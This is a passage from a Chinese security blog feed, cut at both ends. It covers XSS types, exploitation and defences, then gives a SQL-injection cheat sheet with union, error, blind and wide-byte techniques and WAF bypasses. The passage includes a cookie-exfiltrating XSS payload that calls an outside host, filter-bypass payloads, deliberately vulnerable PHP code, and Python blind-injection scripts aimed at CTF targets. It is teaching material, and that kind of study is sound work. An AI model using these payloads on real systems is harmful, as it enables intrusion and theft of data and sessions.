class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$action=$_GET[<span class="string">'action'</span>];</span><br><span class="line">$name=$_GET[<span class="string">'name'</span>];</span><br><span class="line">$password=$_GET[<span class="string">'password'</span>];</span><br><span class="line">$conn=mysql_connect(<span class="string">'127.0.0.1'</span>,<span class="string">'root'</span>,<span class="string">'root'</span>);</span><br><span class="line">mysql_select_db(<span class="string">"test"</span>,$conn);</span><br><span class="line"><span class="keyword">if</span>($action==<span class="string">'get'</span>)&#123;</span><br><span class="line">    $sql=<span class="string">"select * from test where username='$name'"</span>;</span><br><span class="line">    $result=mysql_query($sql,$conn);</span><br><span class="line">    <span class="keyword">if</span>($result)&#123;</span><br><span class="line">        <span class="keyword">while</span> ($row = mysql_fetch_assoc($result)) &#123;</span><br><span class="line">            print_r($row);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Error"</span>.mysql_error().<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $sql=<span class="string">"insert into test values ('$name', '$password')"</span>;</span><br><span class="line">    $result=mysql_query($sql,$conn);</span><br><span class="line">    <span class="keyword">if</span>($result)&#123;</span><br><span class="line">        print_r($result);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Error"</span>.mysql_error().<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>先插入一个存在问题的数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/saved.php?action=insert&amp;name=anemone&amp;password=&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="/xss-XSS类型、利用和防御/1550129399199.png" alt="1550129399199"></p><p>接着访问：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/saved.php?action=get&amp;name=anemone</span><br></pre></td></tr></table></figure><p><img src="/xss-XSS类型、利用和防御/1550129511724.png" alt="1550129511724"></p><h2 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h2><p>通过js操控dom引入xss代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="comment">// http://127.0.0.1/dom.php?url=javascript:alert(/xss/)</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> url_search=<span class="built_in">document</span>.location.search;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> the_url = <span class="keyword">new</span> URLSearchParams(url_search).get(<span class="string">'url'</span>);</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> markup=<span class="string">'&lt;a href="'</span>+the_url+<span class="string">'"&gt;Link&lt;/a&gt;'</span>;</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.write(markup);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/xss-XSS类型、利用和防御/1550131058571.png" alt="1550131058571"></p><p>出现场景：</p><ul><li>在前端实现页面跳转（location.href=’javascript:alert(1)’）</li><li>取值写入页面或动态执行 <ul><li>div.innerHTML=payload</li><li>eval(payload)</li></ul></li><li>使用HTML5 postMessage进行跨域通讯 </li></ul><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>发送cookie：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/reflect.php?xss=&lt;script&gt;fetch(&apos;http://127.0.0.2:8888/&apos;.concat(window.btoa(document.cookie)))&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>使用XSSPT平台：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/reflect.php?xss=%3Cscript%20src=https://xsspt.com/v5Ia54%3E%3C/script%3E</span><br></pre></td></tr></table></figure></p><h2 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h2><ol><li><p>使用input/img/svg等标签和onerror/onload/onfocus等属性绕过关键词:</p><ul><li><code>&lt;input autofocus id=a name=&quot;javascript:123&quot; onfocus=&quot;alert(1)&quot;&gt;</code></li><li><code>&lt;img/src/onerror=alert(1)&gt;</code></li><li><code>&lt;svg/onload=alert(1)&gt;</code></li><li><code>&lt;video/src/onerror=alert(1)&gt;</code></li><li><code>&lt;video/src/onloadstart=alert(1)&gt;</code></li><li><code>&lt;details/open/ontoggle=alert(1)&gt;</code></li></ul></li><li><p>使用concat绕过黑名单单词：</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'javascri'</span>.concat(<span class="string">'pt:aler'</span>,<span class="string">'t(1)'</span>)</span><br></pre></td></tr></table></figure></li><li><p>使用<code>+</code>绕过空格</p></li><li><p>二次编码</p></li></ol><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><p>开启Cookie的HttpOnly选项</p><h2 id="反射型-1"><a href="#反射型-1" class="headerlink" title="反射型"></a>反射型</h2><ul><li><p>（默认选项）添加浏览器保护头部<code>x-xss-protection: 1</code></p></li><li><p>渲染至页面时进行htmlencode</p><p><code>htmlspecialchars(&#39;&lt;script&gt;&#39;) =&gt; &amp;lt;script&amp;gt;</code></p></li></ul><h2 id="存储型-1"><a href="#存储型-1" class="headerlink" title="存储型"></a>存储型</h2><p>渲染至页面时进行htmlencode</p><h2 id="DOM型-1"><a href="#DOM型-1" class="headerlink" title="DOM型"></a>DOM型</h2><p>在js中进行<code>encodeURI</code>过滤，对于标签中的属性（如示例中的href）使用正则过滤。</p><h2 id="样例"><a href="#样例" class="headerlink" title="样例"></a>样例</h2><p>至少过滤如下符号：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">escapeHTML(t)&#123;</span><br><span class="line">    <span class="keyword">return</span> t.replace(<span class="regexp">/&amp;/g</span>,<span class="string">"&amp;amp;"</span>)</span><br><span class="line">        .replace(<span class="regexp">/&lt;/g</span>,<span class="string">"&amp;lt;"</span>)</span><br><span class="line">        .replace(<span class="regexp">/&gt;/g</span>,<span class="string">"&amp;gt;"</span>)</span><br><span class="line">        .replace(<span class="regexp">/ /g</span>,<span class="string">"&amp;nbsp;"</span>)</span><br><span class="line">        .replace(<span class="regexp">/"/g</span>,<span class="string">"&amp;#34;"</span>)</span><br><span class="line">        .replace(<span class="regexp">/'/g</span>,<span class="string">"&amp;#39;"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li>驱散前端安全梦魇——DOMXSS典型场景分析与修复指南，<a href="https://security.tencent.com/index.php/blog/msg/107" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/107</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;XSS类型&quot;&gt;&lt;a href=&quot;#XSS类型&quot; class=&quot;headerlink&quot; title=&quot;XSS类型&quot;&gt;&lt;/a&gt;XSS类型&lt;/h1&gt;&lt;h2 id=&quot;反射型&quot;&gt;&lt;a href=&quot;#反射型&quot; class=&quot;headerlink&quot; title=&quot;反射型&quot;&gt;&lt;/
      
    
    </summary>
    
      <category term="Web安全-XSS" scheme="http://anemone.top/categories/Web%E5%AE%89%E5%85%A8-XSS/"/>
    
    
  </entry>
  
  <entry>
    <title>SQL注入总结</title>
    <link href="http://anemone.top/sqli-SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"/>
    <id>http://anemone.top/sqli-SQL注入总结/</id>
    <published>2019-02-12T07:53:50.000Z</published>
    <updated>2019-09-22T10:14:18.693Z</updated>
    
    <content type="html"><![CDATA[<h1 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h1><h2 id="Union-Based"><a href="#Union-Based" class="headerlink" title="Union Based"></a>Union Based</h2><p>最基本的注入类型，以MySQL为例，假设有注入点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `test` </span><br><span class="line">WHERE `username`=&apos;admin&apos; and `password`=&apos;*&apos;;</span><br></pre></td></tr></table></figure><h3 id="0x01-判断注入点"><a href="#0x01-判断注入点" class="headerlink" title="0x01 判断注入点"></a>0x01 判断注入点</h3><p>若原先能够查询到数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; and &apos;1&apos;=&apos;1&apos;%23    #有数据</span><br><span class="line">admin&apos; and &apos;1&apos;=&apos;2&apos;%23    #无数据</span><br></pre></td></tr></table></figure><p>若原先查询不到数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; or &apos;1&apos;=&apos;1&apos;%23    #有数据</span><br><span class="line">admin&apos; or &apos;1&apos;=&apos;2&apos;%23    #无数据</span><br></pre></td></tr></table></figure><p>若为整数型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">7 &amp;&amp; 1=2 %23</span><br><span class="line">7 &amp;&amp; 1=1 %23</span><br><span class="line">7 || 1=2 %23</span><br><span class="line">7 || 1=2 %23</span><br></pre></td></tr></table></figure><h3 id="0x02-查询共有多少字段"><a href="#0x02-查询共有多少字段" class="headerlink" title="0x02 查询共有多少字段"></a>0x02 查询共有多少字段</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a&apos; UNION SELECT 1%23 </span><br><span class="line">a&apos; UNION SELECT 1,2%23</span><br><span class="line">a&apos; UNION SELECT 1,2,3%23</span><br></pre></td></tr></table></figure><p>…直到正常显示数据为止，或者：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a&apos; ORDER BY 1%23</span><br><span class="line">a&apos; ORDER BY 2%23</span><br><span class="line">a&apos; ORDER BY 3%23</span><br></pre></td></tr></table></figure><p>…直到网页报错为止。</p><h3 id="0x03-查询库"><a href="#0x03-查询库" class="headerlink" title="0x03 查询库"></a>0x03 查询库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&apos; union select SCHEMA_NAME,2,3,4,5 from information_schema.SCHEMATA %23</span><br></pre></td></tr></table></figure><h3 id="0x04-查询表"><a href="#0x04-查询表" class="headerlink" title="0x04 查询表"></a>0x04 查询表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a&apos; union select TABLE_NAME,2,3,4,5 from information_schema.TABLES where TABLE_SCHEMA=&apos;test&apos; limit 0,1 %23 #第一个表</span><br><span class="line">a&apos; union select TABLE_NAME,2,3,4,5 from information_schema.TABLES where TABLE_SCHEMA=&apos;test&apos; limit 1,1 %23 #第二个表</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="0x05-查询字段"><a href="#0x05-查询字段" class="headerlink" title="0x05 查询字段"></a>0x05 查询字段</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a&apos; union select COLUMN_NAME,2,3,4,5 from information_schema.COLUMNS where TABLE_NAME=&apos;test&apos; limit 0,1 %23 #第一个字段</span><br><span class="line">a&apos; union select COLUMN_NAME,2,3,4,5 from information_schema.COLUMNS where TABLE_NAME=&apos;test&apos; limit 0,1 %23 #第二个字段</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="0x05-查询记录"><a href="#0x05-查询记录" class="headerlink" title="0x05 查询记录"></a>0x05 查询记录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&apos; union select username,2,3,4,5 from test.test %23</span><br></pre></td></tr></table></figure><h3 id="关于注释"><a href="#关于注释" class="headerlink" title="关于注释"></a>关于注释</h3><ul><li><code>#</code>可以换成<code>%23</code></li><li><code>--+</code></li></ul><h2 id="Error-Based"><a href="#Error-Based" class="headerlink" title="Error Based"></a>Error Based</h2><p>若有错误回显的情况下可以使用mysql的一些函数，引发错误，mysql报错时会将函数参数的值返回，如：</p><p><img src="/sqli-SQL注入总结/1549959620738.png" alt="1549959620738"></p><p>常用的报错函数有：</p><ul><li><p>updatexml()<br><code>updatexml(1,concat(0x7e,(select @@version),0x7e),1)</code></p></li><li><p>extractvalue()<br><code>extractvalue(1,concat(0x7e,version(),0x7e))</code></p></li><li><p>floor()<br><code>(select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)</code></p></li><li><p>geometrycollection() 、multipoint() 、polygon()、multipolygon()、linestring()、multilinestring() #5.5以上不适用</p><p><code>geometrycollection((select * from(select * from(select user())a)b))</code></p></li><li><p>exp() #5.5以上不适用</p><p><code>exp(~(select * from(select user())a));</code></p></li></ul><h2 id="Bool-Time-Based-（Blind-Based）"><a href="#Bool-Time-Based-（Blind-Based）" class="headerlink" title="Bool/Time Based （Blind Based）"></a>Bool/Time Based （Blind Based）</h2><h3 id="Bool-Based"><a href="#Bool-Based" class="headerlink" title="Bool Based"></a>Bool Based</h3><p>若原先能够/不能查询到数据，那么若猜测字段正确，那么现在能够/不能查询数据。</p><p>若原先能够查询到数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*&apos; and length((database()))&lt;8#</span><br><span class="line">*&apos; and ascii(substring((database()),1,1))=100# 猜测字段</span><br></pre></td></tr></table></figure><p>若原先不能查询数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*&apos; or length((database()))&lt;8#</span><br><span class="line">*&apos; or ascii(substring((database()),1,1))=100# 猜测字段</span><br></pre></td></tr></table></figure><p>给出exp模板：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=UTF-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">result = <span class="string">''</span></span><br><span class="line">url = <span class="string">'http://a3edf37f0d9741c6ad151c8bafbcad60fc11a19cf7f747a9.game.ichunqiu.com/index.php?'</span></span><br><span class="line">payload = <span class="string">'id=0 or if((ascii(substr((&#123;sql&#125;),&#123;list&#125;,1))&lt;&#123;num&#125;),1,0)'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">32</span>,<span class="number">126</span>):</span><br><span class="line">        <span class="comment">#hh = payload.format(sql='select database()',list=str(i),num=str(j))</span></span><br><span class="line">        <span class="comment">#hh = payload.format(sql='select count(*) from information_schema.tables',list=str(i),num=str(j))</span></span><br><span class="line">        <span class="comment">#hh = payload.format(sql='select table_name from information_schema.tables limit 81,1',list=str(i),num=str(j))</span></span><br><span class="line">        hh = payload.format(sql=<span class="string">'select * from words.f14g'</span>,list=str(i),num=str(j))</span><br><span class="line">        <span class="comment">#print hh</span></span><br><span class="line">        zz = requests.get(url+hh)</span><br><span class="line">        <span class="comment">#print zz.content</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Hello Hacker!!'</span> <span class="keyword">in</span> zz.content:</span><br><span class="line">            result += chr(j<span class="number">-1</span>)</span><br><span class="line">            <span class="keyword">print</span> result</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="Time-Based"><a href="#Time-Based" class="headerlink" title="Time Based"></a>Time Based</h3><p>那么若猜测字段正确，那么现在延迟一段时间后再返回。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*&apos; or if(ascii(substring((database()),1,1))=116, sleep(100), 1);</span><br></pre></td></tr></table></figure><p>给出exp模板：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">'0123456789abcdef'</span>:</span><br><span class="line">        url = <span class="string">'http://101.71.29.5:10004/Admin/User/Index?search[table]=flag where 1 and if((ascii(substr((select flag from flag limit 0,1),'</span>+str(i)+<span class="string">',1))='</span>+str(ord(j))+<span class="string">'),sleep(3),0)--'</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url=url,timeout=<span class="number">2.5</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="keyword">print</span> flag</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="其他用到的函数-关键字"><a href="#其他用到的函数-关键字" class="headerlink" title="其他用到的函数/关键字"></a>其他用到的函数/关键字</h3><ul><li><p>regexp binary </p><p><code>and password regexp binary ‘^A’#</code></p></li><li><p>mid() 同substr</p><p><code>MID(version(),1,1)</code></p></li><li><p>ord() 同ascii</p></li></ul><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>使用<code>;</code>结束上一句查询语句后再执行另一条语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM test;select if(1=1,SLEEP(100),1);</span><br></pre></td></tr></table></figure><h1 id="非where的注入点"><a href="#非where的注入点" class="headerlink" title="非where的注入点"></a>非where的注入点</h1><h2 id="order-by注入点"><a href="#order-by注入点" class="headerlink" title="order by注入点"></a>order by注入点</h2><ul><li><p>Error Based</p><p><code>order by 1 and(updatexml(1,concat(0x7e,@@version,0x7e),0))</code></p></li><li><p>Time Based #5.5复现失败</p><p><code>order by if(1=2,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test))</code></p></li><li><p>Bool Based</p><p><code>order by (select+1+regexp+if(substring(user(),1,1)=0x72,1,0x00))</code> </p></li></ul><h2 id="limit注入点"><a href="#limit注入点" class="headerlink" title="limit注入点"></a>limit注入点</h2><ul><li><code>limit 1,1 procedure analyse(extractvalue(1,concat(0x7e,version(),0x7e)),1)</code></li></ul><h2 id="group-by注入点"><a href="#group-by注入点" class="headerlink" title="group by注入点"></a>group by注入点</h2><p><code>GROUP BY if(1=2,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test));</code></p><h2 id="table注入点"><a href="#table注入点" class="headerlink" title="table注入点"></a>table注入点</h2><p><code>users where updatexml(1, concat(0x7e, (select user()), 0x7e), 1)#</code></p><h2 id="desc注入点"><a href="#desc注入点" class="headerlink" title="desc注入点"></a>desc注入点</h2><p>desc不完全可控和table结合，需要保证desc成功，table报错，只有在desc和table只能有一个含”&#96;”时能注入（都含有或都不含有则无解）<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"xiaoyu"</span>);</span><br><span class="line">mysql_query(<span class="string">"use b2cshop"</span>);</span><br><span class="line">$table = $_GET[<span class="string">'table'</span>];</span><br><span class="line">mysql_query(<span class="string">"desc `shop_&#123;$table&#125;`"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"DESC 出错:"</span>.mysql_error()); <span class="comment">//表名不完全可控</span></span><br><span class="line">$sql = <span class="string">"select * from shop_&#123;$table&#125; where 1=1"</span>;</span><br><span class="line"><span class="keyword">echo</span> $sql;</span><br><span class="line">var_dump(mysql_fetch_array(mysql_query(<span class="string">"$sql"</span>)));</span><br><span class="line"><span class="keyword">echo</span> mysql_error();</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?table=users` `where updatexml(1,concat(0x5e24,(select user()),0x5e24),1)#</span><br><span class="line"></span><br><span class="line">desc `shop_users` `where updatexml(1,concat(0x5e24,(select user()),0x5e24),1)#`</span><br></pre></td></tr></table></figure><h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><h2 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h2><p>即使输入时使用了addslashes进行了过滤，但是MySQL的客户端字符集（character_set_client）设置为GBK、BIG5或其他，导致<code>/</code>在解码时被跳脱，例如有如下程序：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;meta charset=<span class="string">"gbk"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$name=$_GET[<span class="string">'name'</span>];</span><br><span class="line">$name=addslashes($name); <span class="comment">//name被转义</span></span><br><span class="line"></span><br><span class="line">$conn=mysql_connect(<span class="string">'127.0.0.1'</span>,<span class="string">'root'</span>,<span class="string">'root'</span>);</span><br><span class="line">mysql_select_db(<span class="string">"test"</span>,$conn);</span><br><span class="line">$result=mysql_query(<span class="string">"SET NAMES 'GBK'"</span>);</span><br><span class="line">$sql=<span class="string">"select * from test where username='"</span>.$name.<span class="string">"'"</span>;</span><br><span class="line">$result=mysql_query($sql,$conn);</span><br><span class="line"><span class="keyword">if</span>($result)&#123;</span><br><span class="line">    <span class="keyword">while</span> ($row = mysql_fetch_assoc($result)) &#123;</span><br><span class="line">        print_r($row);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Error"</span>.mysql_error().<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload为<code>?name=admin%df%27%20union%20select%201,2%20%23</code></p><p>编码过程<br><code>1&#39; ==addslashes==&gt; 1\&#39; (1\x5c\x27)</code><br><code>1%df&#39; ==addslashes==&gt; 1%df\&#39;(1\xdf\x5c\x27) ==encode(gbk)==&gt; 1運&#39;</code>     #<code>&#39;</code>逃逸</p><h2 id="iconv转换情况"><a href="#iconv转换情况" class="headerlink" title="iconv转换情况"></a>iconv转换情况</h2><p>gbk编码转换成utf8时，转换时也会引发错误：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;meta charset=<span class="string">"gbk"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$conn=mysql_connect(<span class="string">'127.0.0.1'</span>,<span class="string">'root'</span>,<span class="string">'root'</span>);</span><br><span class="line">mysql_select_db(<span class="string">"test"</span>,$conn);</span><br><span class="line"></span><br><span class="line">$name=$_GET[<span class="string">'name'</span>];</span><br><span class="line">mysql_query(<span class="string">"set names UTF-8"</span>) ;</span><br><span class="line">$bar =iconv(<span class="string">"GBK"</span>,<span class="string">"UTF-8"</span>, addslashes($name));</span><br><span class="line"></span><br><span class="line">$sql=<span class="string">"select * from test where username='"</span>.$name.<span class="string">"'"</span>;</span><br><span class="line">$result=mysql_query($sql,$conn);</span><br><span class="line"><span class="keyword">if</span>($result)&#123;</span><br><span class="line">    <span class="keyword">while</span> ($row = mysql_fetch_assoc($result)) &#123;</span><br><span class="line">        print_r($row);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Error"</span>.mysql_error().<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>payload为<code>admin%e5%5c%27%20union%20select%201,2%20%23</code>(<code>admin%e5\&#39; union select 1,2 #</code>)</p><p>编码过程（由于<code>\xe5\x5c</code>转为UTF-8为<code>\xe9\x8c\xa6</code>）：</p><p><code>%e5\&#39; (\xe5\x5c\x27) ==addslashes==&gt; %e5\\\&#39; (\xe5\x5c\x5c\x5c\x27) ==iconv==&gt; \xe9\x8c\xa6\x5c\x5c\x27</code></p><p>另外，若编码为BIG5时，payload为<code>1兝\&#39; =&gt; 1\xa2\x5c\x5c\x27 =&gt; 1?\\&#39;</code>。</p><h2 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h2><ul><li><p>换用utf8字符集</p></li><li><p>使用mysql_set_charset()设置字符集并且使用mysql_real_escape_string()转义，其会考虑当前字符集所以不会产生逃逸问题：</p><p><code>mysql_set_charset(&#39;gbk&#39;);$name=mysql_real_escape_string($name);</code></p></li></ul><h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><h2 id="绕过字符"><a href="#绕过字符" class="headerlink" title="绕过字符"></a>绕过字符</h2><ul><li><p>绕过空格</p><ul><li>%0a(<code>\r</code>)、%0b(<code>\t</code>)、%a0(+)</li></ul></li><li><p>绕过单引号</p><ul><li>编码：Unicode（IIS支持）、Hex</li><li>函数：char</li><li>宽字节</li><li>数字型</li></ul></li><li><p>绕过union</p><ul><li>使用盲注</li></ul></li><li><p>绕过and/or</p><ul><li>&amp;&amp; / ||</li></ul></li><li><p>substring()</p><ul><li>mid() left() right()</li></ul></li><li><p>绕过小括号</p><ul><li><code>?username=admin&#39; and password binary regexp &#39;^A&#39;</code></li></ul></li></ul><h2 id="绕过ngx-lua-waf"><a href="#绕过ngx-lua-waf" class="headerlink" title="绕过ngx_lua_waf"></a>绕过ngx_lua_waf</h2><p>详细请参考<a href="https://www.t00ls.net/articles-45736.html" target="_blank" rel="noopener">Bypass ngx_lua_waf SQL注入防御（多姿势）</a></p><h3 id="HTTP-参数污染（HPP）"><a href="#HTTP-参数污染（HPP）" class="headerlink" title="HTTP 参数污染（HPP）"></a>HTTP 参数污染（HPP）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.8.147/test/sql.aspx</span><br><span class="line">?id=1 UNION/&amp;ID=/SELECT null,name,null/&amp;Id=/FROM 